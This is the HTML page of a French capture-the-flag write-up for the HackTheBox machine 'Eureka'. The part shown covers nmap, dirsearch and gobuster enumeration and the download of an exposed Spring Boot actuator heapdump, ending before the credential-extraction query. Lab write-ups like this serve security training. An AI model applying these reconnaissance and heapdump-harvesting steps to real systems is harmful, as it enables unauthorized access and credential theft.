@@ -1,0 +1,970 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Eureka - z3rodol</title><meta name="Description" content="This is my cool site"><meta property="og:url" content="http://localhost:1313/eureka/">
+  <meta property="og:site_name" content="z3rodol">
+  <meta property="og:title" content="Eureka">
+  <meta property="og:description" content="Eureka est une machine Linux de difficulté Hard qui commence avec un site web Spring Boot. J’exploite un point de terminaison heapdump exposé pour récupérer les identifiants de la mémoire et l’accès SSH. Ensuite, j’empoisonne la configuration de Spring Cloud Gateway pour récupérer les identifiants de connexion d’un autre utilisateur. Pour obtenir l’accès root, j’exploite une injection arithmétique Bash pour obtenir l’exécution d’un script analysant les journaux sur un cron.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-11T13:49:31+00:00">
+    <meta property="article:modified_time" content="2025-12-11T13:49:31+00:00">
+    <meta property="article:tag" content="Hard">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="SSRF">
+    <meta property="article:tag" content="Log Poisoning">
+    <meta property="article:tag" content="Springboot Heapdump">
+    <meta property="og:image" content="http://localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/logo.png">
+  <meta name="twitter:title" content="Eureka">
+  <meta name="twitter:description" content="Eureka est une machine Linux de difficulté Hard qui commence avec un site web Spring Boot. J’exploite un point de terminaison heapdump exposé pour récupérer les identifiants de la mémoire et l’accès SSH. Ensuite, j’empoisonne la configuration de Spring Cloud Gateway pour récupérer les identifiants de connexion d’un autre utilisateur. Pour obtenir l’accès root, j’exploite une injection arithmétique Bash pour obtenir l’exécution d’un script analysant les journaux sur un cron.">
+<meta name="application-name" content="z3rodol">
+<meta name="apple-mobile-web-app-title" content="z3rodol">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/eureka/" /><link rel="prev" href="http://localhost:1313/down/" /><link rel="next" href="http://localhost:1313/solidstate/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Eureka",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/eureka\/"
+        },"genre": "posts","keywords": "Hard, Linux, SSRF, Log Poisoning, Springboot Heapdump","wordcount":  1896 ,
+        "url": "http:\/\/localhost:1313\/eureka\/","datePublished": "2025-12-11T13:49:31+00:00","dateModified": "2025-12-11T13:49:31+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "z3rodol"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="z3rodol">z3rodol Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="z3rodol">z3rodol Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Eureka</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://z3rodol.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>z3rodol</a></span>&nbsp;<span class="post-category">included in <a href="/categories/machines/"><i class="far fa-folder" aria-hidden="true"></i>Machines</a>&nbsp;<a href="/categories/hackthebox/"><i class="far fa-folder" aria-hidden="true"></i>Hackthebox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2025-12-11">2025-12-11</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;1896 words&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;9 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#énumération">Énumération</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#http---tcp-80">HTTP - TCP 80</a>
+          <ul>
+            <li><a href="#gobuster">Gobuster</a></li>
+            <li><a href="#vhost-fuzzing">Vhost Fuzzing</a></li>
+            <li><a href="#site">Site</a></li>
+          </ul>
+        </li>
+        <li><a href="#eureka---tcp-8761">Eureka - TCP 8761</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-as-oscar190">Shell as oscar190</a>
+      <ul>
+        <li><a href="#sringboot-heapdump">Sringboot Heapdump</a></li>
+        <li><a href="#ssh">SSH</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-as-miranda-wise">Shell as Miranda-Wise</a>
+      <ul>
+        <li><a href="#tester-les-mots-de-passe">Tester les mots de passe</a></li>
+        <li><a href="#mysql">MySQL</a></li>
+        <li><a href="#eureka">Eureka</a></li>
+        <li><a href="#ssrf">SSRF</a></li>
+        <li><a href="#ssh-1">SSH</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-en-tant-que-root">Shell en tant que root</a>
+      <ul>
+        <li><a href="#log-poisoning">Log poisoning</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/eureka.png"
+        data-srcset="/images/Eureka/eureka.png, /images/Eureka/eureka.png 1.5x, /images/Eureka/eureka.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/eureka.png"
+        title="Eureka" width="608" height="315" /></p>
+<p><code>Eureka</code> est une machine Linux de difficulté Hard qui commence avec un site web <strong>Spring Boot</strong>. J&rsquo;exploite un point de terminaison <code>heapdump</code> exposé pour récupérer les identifiants de la mémoire et l&rsquo;accès SSH. Ensuite, j&rsquo;empoisonne la configuration de Spring Cloud Gateway pour récupérer les identifiants de connexion d&rsquo;un autre utilisateur. Pour obtenir l&rsquo;accès root, j&rsquo;exploite une injection arithmétique Bash pour obtenir l&rsquo;exécution d&rsquo;un script analysant les journaux sur un cron.</p>
+<h1 id="énumération">Énumération</h1>
+<h2 id="nmap">Nmap</h2>
+<p>Le scan Nmap révèle 3 ports ouverts :</p>
+<ul>
+<li>22 pour le SSH</li>
+<li>80 pour le HTTP</li>
+<li>8761 pour un serveur <code>Spring Eureka</code></li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nmap 10.10.11.66 --min-rate <span class="m">1000</span> -vv -sC -sV -p-</span></span></code></pre></div></div>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PORT     STATE SERVICE REASON         VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> d6b2104232354dc9aebd3f1f5865ce49 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpa5HH8lfpsh11cCkEoqcNXWPj6wh8GaDrnXst/q7zd1PlBzzwnhzez+7mhwfv1PuPf5fZ7KtZLMfVPuUzkUHVEwF0gSN0GrFcKl/D34HmZPZAsSpsWzgrE2sayZa3xZuXKgrm5O4wyY+LHNPuHDUo0aUqZp/f7SBPqdwDdBVtcE8ME/AyTeJiJrOhgQWEYxSiHMzsm3zX40ehWg2vNjFHDRZWCj3kJQi0c6Eh0T+hnuuK8A3Aq2Ik+L2aITjTy0fNqd9ry7i6JMumO6HjnSrvxAicyjmFUJPdw1QNOXm+m+p37fQ+6mClAh15juBhzXWUYU22q2q9O/Dc/SAqlIjn1lLbhpZNengZWpJiwwIxXyDGeJU7VyNCIIYU8J07BtoE4fELI26T8u2BzMEJI5uK3UToWKsriimSYUeKA6xczMV+rBRhdbGe39LI5AKXmVM1NELtqIyt7ktmTOkRQ024ZoSS/c+ulR4Ci7DIiZEyM2uhVfe0Ah7KnhiyxdMSlb0<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 90119d67b6f664d4df7fed4a902e6d7b <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNqI0DxtJG3vy9f8AZM8MAmyCh1aCSACD/EKI7solsSlJ937k5Z4QregepNPXHjE+w6d8OkSInNehxtHYIR5nKk<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 9437d342955dadf77973a6379445ad47 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHNmmTon1qbQUXQdI6Ov49enFe6SgC40ECUXhF0agNVn
+</span></span><span class="line"><span class="cl">80/tcp   open  http    syn-ack ttl <span class="m">63</span> nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://furni.htb/
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">8761/tcp open  unknown syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">401</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Vary: Origin
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Vary: Access-Control-Request-Method
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Vary: Access-Control-Request-Headers</span></span></code></pre></div></div>
+<p>J&rsquo;ajoute le nom de domaine dans le fichier <code>/etc/hosts</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.10.11.66 furni.htb&#34;</span> <span class="p">|</span> tee -a /etc/hosts</span></span></code></pre></div></div>
+<h2 id="http---tcp-80">HTTP - TCP 80</h2>
+<h3 id="gobuster">Gobuster</h3>
+<p>Je trouve beaucoup de répertoires dont ce <code>actuator</code> qui m&rsquo;intrigue assez. J&rsquo;ai aussi remarqué que très peu de wordlists de <code>seclists</code> avait ce mot.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>root@exegol-htb<span class="o">]</span> /workspace/Eureka
+</span></span><span class="line"><span class="cl">❯ dirsearch -u http://furni.htb -t <span class="m">50</span> -x 400,500
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  _<span class="p">|</span>. _ _  _  _  _ _<span class="p">|</span>_    v0.4.3
+</span></span><span class="line"><span class="cl"> <span class="o">(</span>_<span class="o">||</span><span class="p">|</span> _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_<span class="o">||</span> <span class="o">(</span>_<span class="p">|</span> <span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Extensions: php, asp, aspx, jsp, html, htm <span class="p">|</span> HTTP method: GET <span class="p">|</span> Threads: <span class="m">50</span> <span class="p">|</span> Wordlist size: <span class="m">12289</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Target: http://furni.htb/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:06:35<span class="o">]</span> Scanning:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:06:43<span class="o">]</span> <span class="m">200</span> -   14KB - /about
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:06:43<span class="o">]</span> <span class="m">200</span> -    2KB - /actuator
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:06:43<span class="o">]</span> <span class="m">200</span> -    20B - /actuator/caches
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:06:43<span class="o">]</span> <span class="m">200</span> -    6KB - /actuator/env
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:06:43<span class="o">]</span> <span class="m">200</span> -     2B - /actuator/info
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:06:43<span class="o">]</span> <span class="m">200</span> -    54B - /actuator/scheduledtasks
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:06:43<span class="o">]</span> <span class="m">200</span> -   467B - /actuator/features
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:06:43<span class="o">]</span> <span class="m">200</span> -    15B - /actuator/health
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:06:43<span class="o">]</span> <span class="m">200</span> -    3KB - /actuator/metrics
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:06:43<span class="o">]</span> <span class="m">405</span> -   114B - /actuator/refresh
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:06:43<span class="o">]</span> <span class="m">200</span> -   35KB - /actuator/mappings
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:06:43<span class="o">]</span> <span class="m">200</span> -   36KB - /actuator/configprops
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:06:43<span class="o">]</span> <span class="m">200</span> -   99KB - /actuator/loggers
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:06:43<span class="o">]</span> <span class="m">200</span> -  180KB - /actuator/conditions
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:06:43<span class="o">]</span> <span class="m">200</span> -  198KB - /actuator/beans
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:06:43<span class="o">]</span> <span class="m">200</span> -  180KB - /actuator/threaddump
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:06:43<span class="o">]</span> <span class="m">200</span> -   76MB - /actuator/heapdump
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:06:53<span class="o">]</span> <span class="m">200</span> -   13KB - /blog
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:06:53<span class="o">]</span> <span class="m">302</span> -     0B - /cart  -&gt;  http://furni.htb/login
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:06:55<span class="o">]</span> <span class="m">302</span> -     0B - /checkout  -&gt;  http://furni.htb/login
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:06:56<span class="o">]</span> <span class="m">302</span> -     0B - /comment  -&gt;  http://furni.htb/login
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:06:59<span class="o">]</span> <span class="m">200</span> -   10KB - /contact
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:07:11<span class="o">]</span> <span class="m">404</span> -   564B - /favicon.ico
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:07:27<span class="o">]</span> <span class="m">200</span> -    2KB - /login
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:07:28<span class="o">]</span> <span class="m">200</span> -    1KB - /logout
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:07:50<span class="o">]</span> <span class="m">200</span> -    9KB - /register
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:07:55<span class="o">]</span> <span class="m">200</span> -   14KB - /services
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:07:56<span class="o">]</span> <span class="m">200</span> -   12KB - /shop
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:08:00<span class="o">]</span> <span class="m">404</span> -   564B - /static/api/swagger.json
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:08:00<span class="o">]</span> <span class="m">404</span> -   564B - /static/api/swagger.yaml
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:08:00<span class="o">]</span> <span class="m">404</span> -   564B - /static/dump.sql</span></span></code></pre></div></div>
+<h3 id="vhost-fuzzing">Vhost Fuzzing</h3>
+<p>Je n&rsquo;ai trouvé aucun sous-domaine.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gobuster vhost -u http://furni.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain -t <span class="m">40</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-8.png"
+        data-srcset="/images/Eureka/Eureka-8.png, /images/Eureka/Eureka-8.png 1.5x, /images/Eureka/Eureka-8.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-8.png"
+        title="/images/Eureka/Eureka-8.png" width="1836" height="640" /></p>
+<h3 id="site">Site</h3>
+<p>J&rsquo;arrive sur un site qui semble être une boutique en ligne de meubles de salons.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-1.png"
+        data-srcset="/images/Eureka/Eureka-1.png, /images/Eureka/Eureka-1.png 1.5x, /images/Eureka/Eureka-1.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-1.png"
+        title="/images/Eureka/Eureka-1.png" width="1920" height="906" /></p>
+<p>Potentiels utilisateurs sur  la page <code>About Us</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-2.png"
+        data-srcset="/images/Eureka/Eureka-2.png, /images/Eureka/Eureka-2.png 1.5x, /images/Eureka/Eureka-2.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-2.png"
+        title="/images/Eureka/Eureka-2.png" width="1739" height="813" /></p>
+<p>Il y a une page de connexion.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-3.png"
+        data-srcset="/images/Eureka/Eureka-3.png, /images/Eureka/Eureka-3.png 1.5x, /images/Eureka/Eureka-3.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-3.png"
+        title="/images/Eureka/Eureka-3.png" width="482" height="386" /></p>
+<p>Je crée un compte sur le <code>/register</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-4.png"
+        data-srcset="/images/Eureka/Eureka-4.png, /images/Eureka/Eureka-4.png 1.5x, /images/Eureka/Eureka-4.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-4.png"
+        title="/images/Eureka/Eureka-4.png" width="792" height="611" /></p>
+<p>Je me connecte ensuite sur le <code>/login</code>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-6.png"
+        data-srcset="/images/Eureka/Eureka-6.png, /images/Eureka/Eureka-6.png 1.5x, /images/Eureka/Eureka-6.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-6.png"
+        title="/images/Eureka/Eureka-6.png" width="439" height="379" /></p>
+<p>Sur la page <code>blog</code>, je peux laisser un commentaire sur un article. Ce commentaire s&rsquo;affiche juste après l&rsquo;avoir envoyé. Mais je n&rsquo;ai rien pu exploiter avec cette fonctionnalité.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-7.png"
+        data-srcset="/images/Eureka/Eureka-7.png, /images/Eureka/Eureka-7.png 1.5x, /images/Eureka/Eureka-7.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-7.png"
+        title="/images/Eureka/Eureka-7.png" width="1122" height="667" /></p>
+<h2 id="eureka---tcp-8761">Eureka - TCP 8761</h2>
+<p>Lorsque je me rends sur le port 8761, on me demande des identifiants. Jusque là, je n&rsquo;en ai pas donc je reviendrai plus tard sur ce port.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-9.png"
+        data-srcset="/images/Eureka/Eureka-9.png, /images/Eureka/Eureka-9.png 1.5x, /images/Eureka/Eureka-9.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-9.png"
+        title="/images/Eureka/Eureka-9.png" width="1257" height="448" /></p>
+<h1 id="shell-as-oscar190">Shell as oscar190</h1>
+<h2 id="sringboot-heapdump">Sringboot Heapdump</h2>
+<p>En me rendant dans le répertoire <code>actuator</code>, j&rsquo;ai du JSON contenant beaucoup de liens.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-11.png"
+        data-srcset="/images/Eureka/Eureka-11.png, /images/Eureka/Eureka-11.png 1.5x, /images/Eureka/Eureka-11.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-11.png"
+        title="/images/Eureka/Eureka-11.png" width="813" height="982" /></p>
+<p>En me rendant sur le lien vers le <code>heapdump</code>, cela télécharge un fichier.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-12.png"
+        data-srcset="/images/Eureka/Eureka-12.png, /images/Eureka/Eureka-12.png 1.5x, /images/Eureka/Eureka-12.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-12.png"
+        title="/images/Eureka/Eureka-12.png" width="1381" height="365" /></p>
+<p>Je vois qu&rsquo;il s&rsquo;agit d&rsquo;un fichier <code>Java HPROF dump</code>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-17.png"
+        data-srcset="/images/Eureka/Eureka-17.png, /images/Eureka/Eureka-17.png 1.5x, /images/Eureka/Eureka-17.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-17.png"
+        title="/images/Eureka/Eureka-17.png" width="866" height="211" /></p>
+<p>Avec ce document trouvé sur <a href="https://www.exploit-db.com/docs/50459" target="_blank" rel="noopener noreffer ">ExploitDB</a>, je vois comment lire le contenu de ce type de fichier. Pour cela, j&rsquo;utiliserai l&rsquo;application <a href="https://visualvm.github.io/download.html" target="_blank" rel="noopener noreffer ">Java VisualVM</a>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-18.png"
+        data-srcset="/images/Eureka/Eureka-18.png, /images/Eureka/Eureka-18.png 1.5x, /images/Eureka/Eureka-18.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-18.png"
+        title="/images/Eureka/Eureka-18.png" width="804" height="391" /></p>
+<p>Après upload du fichier, je change l&rsquo;option <code>summary</code> pour <code>0QL Console</code> dans laquelle je pourrai exécuter des requêtes <code>OQL</code>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-13.png"
+        data-srcset="/images/Eureka/Eureka-13.png, /images/Eureka/Eureka-13.png 1.5x, /images/Eureka/Eureka-13.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-13.png"
+        title="/images/Eureka/Eureka-13.png" width="1652" height="634" /></p>
+<p>Avec la requête suivante j&rsquo;affiche tous les objets de type chaîne de caractères.</p>
